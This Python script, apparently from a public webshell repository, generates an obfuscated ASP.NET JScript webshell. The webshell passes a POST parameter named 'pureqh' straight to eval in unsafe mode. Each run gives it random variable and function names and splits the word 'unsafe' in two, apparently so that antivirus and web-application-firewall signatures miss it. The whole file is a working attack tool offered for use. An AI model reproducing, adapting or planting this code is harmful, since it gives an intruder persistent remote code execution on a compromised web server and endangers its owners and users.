import random

#author: pureqh
#github: https://github.com/pureqh/webshell

shell = '''<%@ Page Language="Jscript" Debug=true%>
<%
var {0}=Request.Form["pureqh"];
var {1}="unsa",{5}="fe",{4}={1}+{5};
function {2}()
{6}
return {0};
{7}
function {3}()
{6}
    eval({2}(),{4});
{7}
{3}()
%>'''



def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
def build_webshell():
    parameter = random_name(2)
    parameter1 = random_name(3)
    FunctionName = random_name(4)
    FunctionName1 = random_name(5)
    parameter2 = random_name(6)
    parameter3 = random_name(7)
    lef = '''{'''
    rig = '''}'''
    shellc = shell.format(parameter,parameter1,FunctionName,FunctionName1,parameter2,parameter3,lef,rig)
    return shellc


if __name__ == '__main__':
    print (build_webshell())